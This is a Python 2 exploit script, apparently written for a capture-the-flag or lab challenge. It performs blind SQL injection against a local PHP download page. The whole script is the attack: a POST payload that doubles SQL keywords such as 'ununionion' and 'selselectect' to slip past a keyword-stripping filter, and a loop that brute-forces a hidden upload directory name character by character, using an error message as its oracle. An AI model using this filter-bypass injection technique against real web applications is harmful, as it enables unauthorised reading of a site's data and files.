
#!/usr/bin/python
# coding:utf-8

import requests

def getFilename():
    data="image=3%20aandnd%20image_name%20lilikeke%200x74657374%20ununionion%20selselectect%200x{filename}%20oorrder%20by%201&image_download=%E6%94%B6%E8%97%8F"
    url = "http://127.0.0.1:32785/downfile.php"

    headers = {
        "Content-Type":"application/x-www-form-urlencoded",
        "Cookie":"PHPSESSID=aq0ad4kl725hjsbnab0orve406",
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
    }

    randStr="0123456789abcdefghijklmnopqrstuvwxyz{"
    fileName = "./Up10aDs/"
    for _ in range(33):
        print "[*]",fileName
        for i in range(len(randStr)):
            # print i
            tmpFileName = fileName+randStr[i]
            #proxies = {"http":"127.0.0.1:8080"}
            #res = requests.post(url,data=data.format(filename=tmpFileName.encode("hex")),headers=headers,proxies=proxies)
            res = requests.post(url,data=data.format(filename=tmpFileName.encode("hex")),headers=headers)
            # print res.text
            if "file may be deleted" not in res.text:
                fileName = fileName + randStr[i-1]
                break


if __name__ == '__main__':
    getFilename()

        

    


